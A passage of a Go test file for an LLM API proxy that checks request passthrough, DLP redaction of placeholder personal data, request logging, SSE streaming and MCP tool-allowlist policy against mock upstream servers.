package llmproxy

import (
	"bytes"
	"context"
	"encoding/json"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/agentsh/agentsh/internal/config"
	"github.com/agentsh/agentsh/internal/mcpinspect"
	"github.com/agentsh/agentsh/internal/mcpregistry"
)

// TestProxy_AnthropicPassthrough tests that requests are correctly
// proxied to an Anthropic-compatible upstream server.
func TestProxy_AnthropicPassthrough(t *testing.T) {
	// Create a mock upstream server that returns an Anthropic-style response
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Verify the request was correctly rewritten
		if r.URL.Path != "/v1/messages" {
			t.Errorf("unexpected path: %s", r.URL.Path)
		}
		if r.Method != http.MethodPost {
			t.Errorf("unexpected method: %s", r.Method)
		}

		// Check that the API key header was passed through
		if r.Header.Get("x-api-key") == "" {
			t.Error("x-api-key header not passed through")
		}

		// Read the request body
		body, err := io.ReadAll(r.Body)
		if err != nil {
			t.Errorf("failed to read request body: %v", err)
			http.Error(w, "failed to read body", http.StatusInternalServerError)
			return
		}

		// Verify the body contains the expected message
		if !strings.Contains(string(body), "Hello, Claude") {
			t.Errorf("unexpected request body: %s", string(body))
		}

		// Return an Anthropic-style response with usage info
		resp := map[string]interface{}{
			"id":   "msg_01XFDUDYJgAACzvnptvVoYEL",
			"type": "message",
			"role": "assistant",
			"content": []map[string]interface{}{
				{
					"type": "text",
					"text": "Hello! How can I assist you today?",
				},
			},
			"model":        "claude-sonnet-4-20250514",
			"stop_reason":  "end_turn",
			"stop_sequence": nil,
			"usage": map[string]int{
				"input_tokens":  10,
				"output_tokens": 25,
			},
		}

		w.Header().Set("Content-Type", "application/json")
		if err := json.NewEncoder(w).Encode(resp); err != nil {
			t.Errorf("failed to encode response: %v", err)
		}
	}))
	defer upstream.Close()

	// Create temp directory for storage
	storageDir := t.TempDir()

	// Create proxy with upstream override pointing to our mock server
	cfg := Config{
		SessionID: "test-session-123",
		Proxy: config.ProxyConfig{
			Mode: "embedded",
			Port: 0, // Auto-select port
			Providers: config.ProxyProvidersConfig{
				Anthropic: upstream.URL,
			},
		},
		DLP: config.DefaultDLPConfig(),
	}

	logger := slog.New(slog.NewTextHandler(io.Discard, nil))
	proxy, err := New(cfg, storageDir, logger)
	if err != nil {
		t.Fatalf("failed to create proxy: %v", err)
	}

	ctx := context.Background()
	if err := proxy.Start(ctx); err != nil {
		t.Fatalf("failed to start proxy: %v", err)
	}
	defer func() {
		shutdownCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		if err := proxy.Stop(shutdownCtx); err != nil {
			t.Errorf("failed to stop proxy: %v", err)
		}
	}()

	// Wait for proxy to be ready
	time.Sleep(10 * time.Millisecond)

	// Make a request to the proxy
	proxyURL := "http://" + proxy.Addr().String() + "/v1/messages"
	reqBody := `{"model": "claude-sonnet-4-20250514", "messages": [{"role": "user", "content": "Hello, Claude!"}]}`
	req, err := http.NewRequest(http.MethodPost, proxyURL, strings.NewReader(reqBody))
	if err != nil {
		t.Fatalf("failed to create request: %v", err)
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("x-api-key", "sk-ant-test-key")
	req.Header.Set("anthropic-version", "2023-06-01")

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("failed to make request: %v", err)
	}
	defer resp.Body.Close()

	// Verify response
	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		t.Fatalf("unexpected status code: %d, body: %s", resp.StatusCode, string(body))
	}

	// Read and parse response
	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		t.Fatalf("failed to read response body: %v", err)
	}

	var result map[string]interface{}
	if err := json.Unmarshal(respBody, &result); err != nil {
		t.Fatalf("failed to parse response: %v", err)
	}

	// Verify the response content
	if result["type"] != "message" {
		t.Errorf("unexpected response type: %v", result["type"])
	}

	usage, ok := result["usage"].(map[string]interface{})
	if !ok {
		t.Fatal("usage not found in response")
	}
	if usage["input_tokens"].(float64) != 10 {
		t.Errorf("unexpected input_tokens: %v", usage["input_tokens"])
	}
	if usage["output_tokens"].(float64) != 25 {
		t.Errorf("unexpected output_tokens: %v", usage["output_tokens"])
	}

	// Allow time for async logging
	time.Sleep(50 * time.Millisecond)

	// Verify storage logged the request and response
	entries, err := proxy.storage.ReadLogEntries()
	if err != nil {
		t.Fatalf("failed to read log entries: %v", err)
	}

	if len(entries) < 2 {
		t.Fatalf("expected at least 2 log entries (request + response), got %d", len(entries))
	}

	// Verify the response entry contains usage data
	var responseEntry ResponseLogEntry
	if err := json.Unmarshal(entries[1], &responseEntry); err != nil {
		t.Fatalf("failed to parse response entry: %v", err)
	}

	if responseEntry.Usage.InputTokens != 10 {
		t.Errorf("expected input_tokens 10 in log, got %d", responseEntry.Usage.InputTokens)
	}
	if responseEntry.Usage.OutputTokens != 25 {
		t.Errorf("expected output_tokens 25 in log, got %d", responseEntry.Usage.OutputTokens)
	}
}

// TestProxy_DLPRedaction tests that DLP correctly redacts PII from requests.
func TestProxy_DLPRedaction(t *testing.T) {
	var receivedBody []byte

	// Create a mock upstream server that captures the request body
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, err := io.ReadAll(r.Body)
		if err != nil {
			t.Errorf("failed to read request body: %v", err)
			http.Error(w, "failed to read body", http.StatusInternalServerError)
			return
		}
		receivedBody = body

		// Return a minimal response
		resp := map[string]interface{}{
			"id":   "msg_test",
			"type": "message",
			"usage": map[string]int{
				"input_tokens":  5,
				"output_tokens": 10,
			},
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(resp)
	}))
	defer upstream.Close()

	// Create temp directory for storage
	storageDir := t.TempDir()

	// Create proxy with DLP enabled
	cfg := Config{
		SessionID: "test-session-dlp",
		Proxy: config.ProxyConfig{
			Mode: "embedded",
			Port: 0,
			Providers: config.ProxyProvidersConfig{
				Anthropic: upstream.URL,
			},
		},
		DLP: config.DLPConfig{
			Mode: "redact",
			Patterns: config.DLPPatternsConfig{
				Email:      true,
				Phone:      true,
				CreditCard: true,
				SSN:        true,
				APIKeys:    false, // Disable API key detection to avoid false positives
			},
		},
	}

	logger := slog.New(slog.NewTextHandler(io.Discard, nil))
	proxy, err := New(cfg, storageDir, logger)
	if err != nil {
		t.Fatalf("failed to create proxy: %v", err)
	}

	ctx := context.Background()
	if err := proxy.Start(ctx); err != nil {
		t.Fatalf("failed to start proxy: %v", err)
	}
	defer func() {
		shutdownCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		proxy.Stop(shutdownCtx)
	}()

	// Wait for proxy to be ready
	time.Sleep(10 * time.Millisecond)

	// Request body with PII that should be redacted
	originalEmail := "john.doe@example.com"
	originalPhone := "555-123-4567"
	originalSSN := "123-45-6789"

	reqBody := map[string]interface{}{
		"model": "claude-sonnet-4-20250514",
		"messages": []map[string]interface{}{
			{
				"role":    "user",
				"content": "Please contact john.doe@example.com or call 555-123-4567. My SSN is 123-45-6789.",
			},
		},
	}

	reqJSON, err := json.Marshal(reqBody)
	if err != nil {
		t.Fatalf("failed to marshal request: %v", err)
	}

	proxyURL := "http://" + proxy.Addr().String() + "/v1/messages"
	req, err := http.NewRequest(http.MethodPost, proxyURL, bytes.NewReader(reqJSON))
	if err != nil {
		t.Fatalf("failed to create request: %v", err)
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("x-api-key", "sk-ant-test-key")

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("failed to make request: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		t.Fatalf("unexpected status code: %d, body: %s", resp.StatusCode, string(body))
	}

	// Verify the upstream received redacted content
	receivedStr := string(receivedBody)

	// Check that original PII is NOT in the received body
	if strings.Contains(receivedStr, originalEmail) {
		t.Error("email was NOT redacted - found in upstream request")
	}
	if strings.Contains(receivedStr, originalPhone) {
		t.Error("phone was NOT redacted - found in upstream request")
	}
	if strings.Contains(receivedStr, originalSSN) {
		t.Error("SSN was NOT redacted - found in upstream request")
	}

	// Check that redaction markers ARE in the received body
	if !strings.Contains(receivedStr, "[REDACTED:email]") {
		t.Error("email redaction marker not found")
	}
	if !strings.Contains(receivedStr, "[REDACTED:phone]") {
		t.Error("phone redaction marker not found")
	}
	if !strings.Contains(receivedStr, "[REDACTED:ssn]") {
		t.Error("SSN redaction marker not found")
	}

	// Allow time for async logging
	time.Sleep(50 * time.Millisecond)

	// Verify DLP info was logged
	entries, err := proxy.storage.ReadLogEntries()
	if err != nil {
		t.Fatalf("failed to read log entries: %v", err)
	}

	if len(entries) < 1 {
		t.Fatal("expected at least 1 log entry")
	}

	// Check the request entry for DLP info
	var requestEntry RequestLogEntry
	if err := json.Unmarshal(entries[0], &requestEntry); err != nil {
		t.Fatalf("failed to parse request entry: %v", err)
	}

	if requestEntry.DLP == nil {
		t.Fatal("DLP info not logged in request entry")
	}

	// Verify redactions were recorded
	redactionTypes := make(map[string]bool)
	for _, r := range requestEntry.DLP.Redactions {
		redactionTypes[r.Type] = true
	}

	if !redactionTypes["email"] {
		t.Error("email redaction not recorded in log")
	}
	if !redactionTypes["phone"] {
		t.Error("phone redaction not recorded in log")
	}
	if !redactionTypes["ssn"] {
		t.Error("ssn redaction not recorded in log")
	}
}

// TestProxy_New tests the New function with various configurations.
func TestProxy_New(t *testing.T) {
	tests := []struct {
		name        string
		cfg         Config
		storagePath string
		wantErr     bool
	}{
		{
			name: "default config",
			cfg: Config{
				SessionID: "test-session",
				Proxy:     config.DefaultProxyConfig(),
				DLP:       config.DefaultDLPConfig(),
				Storage:   config.DefaultLLMStorageConfig(),
			},
			storagePath: t.TempDir(),
			wantErr:     false,
		},
		{
			name: "empty session and storage - noop storage",
			cfg: Config{
				SessionID: "",
				Proxy:     config.DefaultProxyConfig(),
				DLP:       config.DefaultDLPConfig(),
			},
			storagePath: "",
			wantErr:     false,
		},
		{
			name: "custom upstream overrides",
			cfg: Config{
				SessionID: "test-session",
				Proxy: config.ProxyConfig{
					Mode: "embedded",
					Port: 0,
					Providers: config.ProxyProvidersConfig{
						Anthropic: "https://custom.anthropic.example.com",
						OpenAI:    "https://custom.openai.example.com",
					},
				},
				DLP: config.DefaultDLPConfig(),
			},
			storagePath: t.TempDir(),
			wantErr:     false,
		},
		{
			name: "DLP disabled",
			cfg: Config{
				SessionID: "test-session",
				Proxy:     config.DefaultProxyConfig(),
				DLP: config.DLPConfig{
					Mode: "disabled",
				},
			},
			storagePath: t.TempDir(),
			wantErr:     false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			logger := slog.New(slog.NewTextHandler(io.Discard, nil))
			proxy, err := New(tt.cfg, tt.storagePath, logger)
			if (err != nil) != tt.wantErr {
				t.Errorf("New() error = %v, wantErr %v", err, tt.wantErr)
				return
			}
			if err == nil && proxy == nil {
				t.Error("New() returned nil proxy without error")
			}
			if proxy != nil {
				shutdownCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
				defer cancel()
				proxy.Stop(shutdownCtx)
			}
		})
	}
}

// TestProxy_EnvVars tests the EnvVars method.
func TestProxy_EnvVars(t *testing.T) {
	storageDir := t.TempDir()

	cfg := Config{
		SessionID: "test-session-env",
		Proxy: config.ProxyConfig{
			Mode: "embedded",
			Port: 0,
		},
		DLP: config.DefaultDLPConfig(),
	}

	logger := slog.New(slog.NewTextHandler(io.Discard, nil))
	proxy, err := New(cfg, storageDir, logger)
	if err != nil {
		t.Fatalf("failed to create proxy: %v", err)
	}

	// Before starting, Addr should be nil
	if proxy.Addr() != nil {
		t.Error("expected nil Addr before Start")
	}

	// EnvVars should return nil when not started
	if vars := proxy.EnvVars(); vars != nil {
		t.Errorf("expected nil EnvVars before Start, got %v", vars)
	}

	ctx := context.Background()
	if err := proxy.Start(ctx); err != nil {
		t.Fatalf("failed to start proxy: %v", err)
	}
	defer func() {
		shutdownCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		proxy.Stop(shutdownCtx)
	}()

	// After starting, EnvVars should return the expected values
	vars := proxy.EnvVars()
	if vars == nil {
		t.Fatal("expected EnvVars after Start")
	}

	if vars["ANTHROPIC_BASE_URL"] == "" {
		t.Error("ANTHROPIC_BASE_URL not set")
	}
	if vars["OPENAI_BASE_URL"] == "" {
		t.Error("OPENAI_BASE_URL not set")
	}
	if vars["AGENTSH_SESSION_ID"] != "test-session-env" {
		t.Errorf("unexpected AGENTSH_SESSION_ID: %s", vars["AGENTSH_SESSION_ID"])
	}

	// Verify the base URLs point to the proxy
	expectedPrefix := "http://127.0.0.1:"
	if !strings.HasPrefix(vars["ANTHROPIC_BASE_URL"], expectedPrefix) {
		t.Errorf("ANTHROPIC_BASE_URL should start with %s, got %s", expectedPrefix, vars["ANTHROPIC_BASE_URL"])
	}
}

// TestProxy_StorageLogging tests that requests and responses are logged correctly.
func TestProxy_StorageLogging(t *testing.T) {
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		resp := map[string]interface{}{
			"id":   "msg_test",
			"type": "message",
			"usage": map[string]int{
				"input_tokens":  100,
				"output_tokens": 200,
			},
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(resp)
	}))
	defer upstream.Close()

	storageDir := t.TempDir()
	sessionID := "test-storage-logging"

	cfg := Config{
		SessionID: sessionID,
		Proxy: config.ProxyConfig{
			Mode: "embedded",
			Port: 0,
			Providers: config.ProxyProvidersConfig{
				Anthropic: upstream.URL,
			},
		},
		DLP: config.DLPConfig{Mode: "disabled"},
	}

	logger := slog.New(slog.NewTextHandler(io.Discard, nil))
	proxy, err := New(cfg, storageDir, logger)
	if err != nil {
		t.Fatalf("failed to create proxy: %v", err)
	}

	ctx := context.Background()
	if err := proxy.Start(ctx); err != nil {
		t.Fatalf("failed to start proxy: %v", err)
	}
	defer func() {
		shutdownCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		proxy.Stop(shutdownCtx)
	}()

	time.Sleep(10 * time.Millisecond)

	// Make a request
	proxyURL := "http://" + proxy.Addr().String() + "/v1/messages"
	req, _ := http.NewRequest(http.MethodPost, proxyURL, strings.NewReader(`{"test": true}`))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("x-api-key", "sk-ant-test")

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("request failed: %v", err)
	}
	resp.Body.Close()

	time.Sleep(50 * time.Millisecond)

	// Verify log file was created
	logPath := filepath.Join(storageDir, sessionID, "llm-requests.jsonl")
	if _, err := os.Stat(logPath); os.IsNotExist(err) {
		t.Fatalf("log file not created at %s", logPath)
	}

	// Read and verify entries
	entries, err := proxy.storage.ReadLogEntries()
	if err != nil {
		t.Fatalf("failed to read log entries: %v", err)
	}

	if len(entries) != 2 {
		t.Fatalf("expected 2 log entries, got %d", len(entries))
	}

	// Parse and verify request entry
	var reqEntry RequestLogEntry
	if err := json.Unmarshal(entries[0], &reqEntry); err != nil {
		t.Fatalf("failed to parse request entry: %v", err)
	}

	if reqEntry.SessionID != sessionID {
		t.Errorf("expected session_id %s, got %s", sessionID, reqEntry.SessionID)
	}
	if reqEntry.Request.Method != http.MethodPost {
		t.Errorf("expected method POST, got %s", reqEntry.Request.Method)
	}
	if reqEntry.Request.Path != "/v1/messages" {
		t.Errorf("expected path /v1/messages, got %s", reqEntry.Request.Path)
	}
	if reqEntry.Dialect != DialectAnthropic {
		t.Errorf("expected dialect anthropic, got %s", reqEntry.Dialect)
	}

	// Check that API key was redacted in headers
	if apiKey := reqEntry.Request.Headers["X-Api-Key"]; len(apiKey) > 0 && apiKey[0] != "[REDACTED]" {
		t.Errorf("API key was not redacted: %v", apiKey)
	}

	// Parse and verify response entry
	var respEntry ResponseLogEntry
	if err := json.Unmarshal(entries[1], &respEntry); err != nil {
		t.Fatalf("failed to parse response entry: %v", err)
	}

	if respEntry.RequestID != reqEntry.ID {
		t.Errorf("response request_id %s doesn't match request id %s", respEntry.RequestID, reqEntry.ID)
	}
	if respEntry.Response.Status != http.StatusOK {
		t.Errorf("expected status 200, got %d", respEntry.Response.Status)
	}
	if respEntry.Usage.InputTokens != 100 {
		t.Errorf("expected input_tokens 100, got %d", respEntry.Usage.InputTokens)
	}
	if respEntry.Usage.OutputTokens != 200 {
		t.Errorf("expected output_tokens 200, got %d", respEntry.Usage.OutputTokens)
	}
	if respEntry.DurationMs < 0 {
		t.Errorf("expected non-negative duration, got %d", respEntry.DurationMs)
	}
}

// TestProxy_CustomOpenAIProvider tests that a custom OpenAI URL routes all traffic there.
func TestProxy_CustomOpenAIProvider(t *testing.T) {
	var receivedPath string
	var receivedAuth string

	// Create a mock custom provider server
	customProvider := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		receivedPath = r.URL.Path
		receivedAuth = r.Header.Get("Authorization")

		resp := map[string]interface{}{
			"id":      "chatcmpl-test",
			"object":  "chat.completion",
			"choices": []map[string]interface{}{},
			"usage": map[string]int{
				"prompt_tokens":     10,
				"completion_tokens": 20,
				"total_tokens":      30,
			},
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(resp)
	}))
	defer customProvider.Close()

	storageDir := t.TempDir()

	// Custom OpenAI provider URL
	cfg := Config{
		SessionID: "test-custom-provider",
		Proxy: config.ProxyConfig{
			Mode: "embedded",
			Port: 0,
			Providers: config.ProxyProvidersConfig{
				OpenAI: customProvider.URL, // Custom URL
			},
		},
		DLP: config.DLPConfig{Mode: "disabled"},
	}

	logger := slog.New(slog.NewTextHandler(io.Discard, nil))
	proxy, err := New(cfg, storageDir, logger)
	if err != nil {
		t.Fatalf("failed to create proxy: %v", err)
	}

	ctx := context.Background()
	if err := proxy.Start(ctx); err != nil {
		t.Fatalf("failed to start proxy: %v", err)
	}
	defer func() {
		shutdownCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		proxy.Stop(shutdownCtx)
	}()

	time.Sleep(10 * time.Millisecond)

	// Test with OAuth token (would normally go to ChatGPT, but custom URL overrides)
	proxyURL := "http://" + proxy.Addr().String() + "/v1/chat/completions"
	req, _ := http.NewRequest(http.MethodPost, proxyURL, strings.NewReader(`{"test": true}`))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "Bearer eyJhbGciOiJIUzI1NiJ9.oauth-token") // OAuth token

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("request failed: %v", err)
	}
	resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		t.Fatalf("unexpected status: %d", resp.StatusCode)
	}

	// Verify request went to custom provider (not ChatGPT)
	if receivedPath != "/v1/chat/completions" {
		t.Errorf("unexpected path at custom provider: %s", receivedPath)
	}
	if receivedAuth != "Bearer eyJhbGciOiJIUzI1NiJ9.oauth-token" {
		t.Errorf("auth header not passed: %s", receivedAuth)
	}
}

// TestProxy_SSEStreaming tests that SSE streaming responses are handled correctly.
func TestProxy_SSEStreaming(t *testing.T) {
	// Create a mock upstream server that returns an SSE stream
	sseEvents := []string{
		"event: message_start\ndata: {\"type\": \"message_start\", \"message\": {\"id\": \"msg_01\", \"type\": \"message\", \"role\": \"assistant\"}}\n\n",
		"event: content_block_start\ndata: {\"type\": \"content_block_start\", \"index\": 0, \"content_block\": {\"type\": \"text\", \"text\": \"\"}}\n\n",
		"event: content_block_delta\ndata: {\"type\": \"content_block_delta\", \"index\": 0, \"delta\": {\"type\": \"text_delta\", \"text\": \"Hello\"}}\n\n",
		"event: content_block_delta\ndata: {\"type\": \"content_block_delta\", \"index\": 0, \"delta\": {\"type\": \"text_delta\", \"text\": \" World\"}}\n\n",
		"event: content_block_stop\ndata: {\"type\": \"content_block_stop\", \"index\": 0}\n\n",
		"event: message_delta\ndata: {\"type\": \"message_delta\", \"delta\": {\"stop_reason\": \"end_turn\"}, \"usage\": {\"output_tokens\": 10}}\n\n",
		"event: message_stop\ndata: {\"type\": \"message_stop\"}\n\n",
	}

	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/event-stream")
		w.Header().Set("Cache-Control", "no-cache")
		w.WriteHeader(http.StatusOK)

		flusher := w.(http.Flusher)
		for _, event := range sseEvents {
			w.Write([]byte(event))
			flusher.Flush()
			time.Sleep(5 * time.Millisecond) // Simulate streaming
		}
	}))
	defer upstream.Close()

	storageDir := t.TempDir()
	sessionID := "test-sse-streaming"

	cfg := Config{
		SessionID: sessionID,
		Proxy: config.ProxyConfig{
			Mode: "embedded",
			Port: 0,
			Providers: config.ProxyProvidersConfig{
				Anthropic: upstream.URL,
			},
		},
		DLP: config.DLPConfig{Mode: "disabled"},
	}

	logger := slog.New(slog.NewTextHandler(io.Discard, nil))
	proxy, err := New(cfg, storageDir, logger)
	if err != nil {
		t.Fatalf("failed to create proxy: %v", err)
	}

	ctx := context.Background()
	if err := proxy.Start(ctx); err != nil {
		t.Fatalf("failed to start proxy: %v", err)
	}
	defer func() {
		shutdownCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		proxy.Stop(shutdownCtx)
	}()

	time.Sleep(10 * time.Millisecond)

	// Make an SSE streaming request
	proxyURL := "http://" + proxy.Addr().String() + "/v1/messages"
	reqBody := `{"model": "claude-sonnet-4-20250514", "stream": true, "messages": [{"role": "user", "content": "Hello"}]}`
	req, _ := http.NewRequest(http.MethodPost, proxyURL, strings.NewReader(reqBody))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("x-api-key", "sk-ant-test")

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("request failed: %v", err)
	}
	defer resp.Body.Close()

	// Verify response headers indicate SSE
	if !strings.HasPrefix(resp.Header.Get("Content-Type"), "text/event-stream") {
		t.Errorf("expected text/event-stream content-type, got %s", resp.Header.Get("Content-Type"))
	}

	// Read the entire response body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		t.Fatalf("failed to read response body: %v", err)
	}

	// Verify all events were received
	expectedBody := strings.Join(sseEvents, "")
	if string(body) != expectedBody {
		t.Errorf("response body mismatch:\ngot: %q\nwant: %q", string(body), expectedBody)
	}

	// Wait for logging to complete
	time.Sleep(100 * time.Millisecond)

	// Verify storage logged the request and response
	entries, err := proxy.storage.ReadLogEntries()
	if err != nil {
		t.Fatalf("failed to read log entries: %v", err)
	}

	if len(entries) < 2 {
		t.Fatalf("expected at least 2 log entries (request + response), got %d", len(entries))
	}

	// Verify the response was logged with the full streamed body
	var responseEntry ResponseLogEntry
	if err := json.Unmarshal(entries[1], &responseEntry); err != nil {
		t.Fatalf("failed to parse response entry: %v", err)
	}

	// Body size should match the total streamed content
	if responseEntry.Response.BodySize != len(expectedBody) {
		t.Errorf("expected body size %d, got %d", len(expectedBody), responseEntry.Response.BodySize)
	}
}

// TestProxy_SSEStreamingWithDLP tests that DLP is applied to SSE streaming requests.
func TestProxy_SSEStreamingWithDLP(t *testing.T) {
	var receivedBody []byte

	// Create a mock upstream that captures the request and returns SSE
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		receivedBody = body

		w.Header().Set("Content-Type", "text/event-stream")
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("event: message_start\ndata: {\"type\": \"message_start\"}\n\n"))
	}))
	defer upstream.Close()

	storageDir := t.TempDir()

	cfg := Config{
		SessionID: "test-sse-dlp",
		Proxy: config.ProxyConfig{
			Mode: "embedded",
			Port: 0,
			Providers: config.ProxyProvidersConfig{
				Anthropic: upstream.URL,
			},
		},
		DLP: config.DLPConfig{
			Mode: "redact",
			Patterns: config.DLPPatternsConfig{
				Email: true,
			},
		},
	}

	logger := slog.New(slog.NewTextHandler(io.Discard, nil))
	proxy, err := New(cfg, storageDir, logger)
	if err != nil {
		t.Fatalf("failed to create proxy: %v", err)
	}

	ctx := context.Background()
	if err := proxy.Start(ctx); err != nil {
		t.Fatalf("failed to start proxy: %v", err)
	}
	defer func() {
		shutdownCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		proxy.Stop(shutdownCtx)
	}()

	time.Sleep(10 * time.Millisecond)

	// Make request with PII
	proxyURL := "http://" + proxy.Addr().String() + "/v1/messages"
	reqBody := `{"model": "claude-sonnet-4-20250514", "stream": true, "messages": [{"role": "user", "content": "Email me at test@example.com"}]}`
	req, _ := http.NewRequest(http.MethodPost, proxyURL, strings.NewReader(reqBody))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("x-api-key", "sk-ant-test")

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("request failed: %v", err)
	}
	io.ReadAll(resp.Body)
	resp.Body.Close()

	// Verify email was redacted in the request sent to upstream
	if strings.Contains(string(receivedBody), "test@example.com") {
		t.Error("email was NOT redacted in request to upstream")
	}
	if !strings.Contains(string(receivedBody), "[REDACTED:email]") {
		t.Error("email redaction marker not found in request to upstream")
	}
}

// TestProxyWithMCPConfig tests that MCP config fields are wired into the proxy.
func TestProxyWithMCPConfig(t *testing.T) {
	t.Run("policy evaluator created when EnforcePolicy is true", func(t *testing.T) {
		storageDir := t.TempDir()
		cfg := Config{
			SessionID: "test-mcp-policy",
			Proxy:     config.DefaultProxyConfig(),
			DLP:       config.DefaultDLPConfig(),
			MCP: config.SandboxMCPConfig{
				EnforcePolicy: true,
				FailClosed:    true,
				ToolPolicy:    "allowlist",
				AllowedTools: []config.MCPToolRule{
					{Server: "*", Tool: "get_weather"},
				},
			},
		}

		logger := slog.New(slog.NewTextHandler(io.Discard, nil))
		proxy, err := New(cfg, storageDir, logger)
		if err != nil {
			t.Fatalf("New() error: %v", err)
		}
		defer func() {
			shutdownCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancel()
			proxy.Stop(shutdownCtx)
		}()

		if proxy.policy == nil {
			t.Fatal("expected policy evaluator to be set when EnforcePolicy is true")
		}

		// Verify the evaluator uses the config we passed in
		decision := proxy.policy.Evaluate("any-server", "get_weather", "")
		if !decision.Allowed {
			t.Error("expected get_weather to be allowed by policy")
		}

		decision = proxy.policy.Evaluate("any-server", "delete_all", "")
		if decision.Allowed {
			t.Error("expected delete_all to be denied by policy")
		}
	})

	t.Run("no policy evaluator when EnforcePolicy is false", func(t *testing.T) {
		storageDir := t.TempDir()
		cfg := Config{
			SessionID: "test-mcp-no-policy",
			Proxy:     config.DefaultProxyConfig(),
			DLP:       config.DefaultDLPConfig(),
			MCP: config.SandboxMCPConfig{
				EnforcePolicy: false,
			},
		}

		logger := slog.New(slog.NewTextHandler(io.Discard, nil))
		proxy, err := New(cfg, storageDir, logger)
		if err != nil {
			t.Fatalf("New() error: %v", err)
		}
		defer func() {
			shutdownCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancel()
			proxy.Stop(shutdownCtx)
		}()

		if proxy.policy != nil {
			t.Fatal("expected policy evaluator to be nil when EnforcePolicy is false")
		}
	})

	t.Run("SetRegistry sets registry", func(t *testing.T) {
		storageDir := t.TempDir()
		cfg := Config{
			SessionID: "test-mcp-registry",
			Proxy:     config.DefaultProxyConfig(),
			DLP:       config.DefaultDLPConfig(),
		}

		logger := slog.New(slog.NewTextHandler(io.Discard, nil))
		proxy, err := New(cfg, storageDir, logger)
		if err != nil {
			t.Fatalf("New() error: %v", err)
		}
		defer func() {
			shutdownCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancel()
			proxy.Stop(shutdownCtx)
		}()

		if proxy.registry != nil {
			t.Fatal("expected registry to be nil before SetRegistry")
		}

		reg := mcpregistry.NewRegistry()
		reg.Register("test-server", "stdio", "", []mcpregistry.ToolInfo{
			{Name: "my_tool", Hash: "abc123"},
		})

		proxy.SetRegistry(reg)

		if proxy.registry == nil {
			t.Fatal("expected registry to be set after SetRegistry")
		}
		if proxy.registry != reg {
			t.Fatal("expected registry to be the same instance we passed")
		}

		// Verify the registry is usable through the proxy
		entry := proxy.registry.Lookup("my_tool")
		if entry == nil {
			t.Fatal("expected to find my_tool in registry")
		}
		if entry.ServerID != "test-server" {
			t.Errorf("expected ServerID %q, got %q", "test-server", entry.ServerID)
		}
	})

	t.Run("default config has no MCP fields set", func(t *testing.T) {
		storageDir := t.TempDir()
		cfg := Config{
			SessionID: "test-mcp-default",
			Proxy:     config.DefaultProxyConfig(),
			DLP:       config.DefaultDLPConfig(),
		}

		logger := slog.New(slog.NewTextHandler(io.Discard, nil))
		proxy, err := New(cfg, storageDir, logger)
		if err != nil {
			t.Fatalf("New() error: %v", err)
		}
		defer func() {
			shutdownCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancel()
			proxy.Stop(shutdownCtx)
		}()

		if proxy.policy != nil {
			t.Error("expected nil policy for default config")
		}
		if proxy.registry != nil {
			t.Error("expected nil registry for default config")
		}
	})
}

// TestProxyEventCallback tests that SetEventCallback is invoked during
// MCP tool call interception.
func TestProxyEventCallback(t *testing.T) {
	// Create upstream that returns an Anthropic response with a tool_use block.
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		resp := map[string]interface{}{
			"id":          "msg_test",
			"type":        "message",
			"role":        "assistant",
			"stop_reason": "tool_use",
			"content": []map[string]interface{}{
